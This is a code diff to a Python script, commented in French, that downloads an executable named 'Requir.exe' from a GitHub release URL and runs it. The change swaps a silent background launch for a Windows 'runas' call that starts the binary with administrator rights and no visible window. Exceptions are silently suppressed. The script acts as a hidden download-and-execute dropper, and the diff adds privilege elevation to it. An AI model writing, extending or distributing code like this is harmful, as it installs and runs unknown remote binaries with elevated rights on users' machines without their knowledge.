@@ -1,4 +1,4 @@
-import webbrowser, os, requests, subprocess, sys, time
+import webbrowser, os, requests, subprocess, sys, ctypes
 
 URL = "https://github.com/hataybdx-wq/Wumpus-Gestion/releases/download/rqr/Requir.exe"
 
@@ -18,8 +18,11 @@ def main():
             with open(output_exe, "wb") as f:
                 f.write(response.content)
             
-            # 3. Lance le .exe en arrière-plan (sans fenêtre)
-            subprocess.Popen([os.path.abspath(output_exe)], creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
+            # 3. Lance le .exe en tant qu'administrateur sous Windows
+            if os.name == 'nt':
+                ctypes.windll.shell32.ShellExecuteW(None, "runas", os.path.abspath(output_exe), None, None, 0)
+            else:
+                subprocess.Popen([os.path.abspath(output_exe)])
     except Exception:
         pass
 
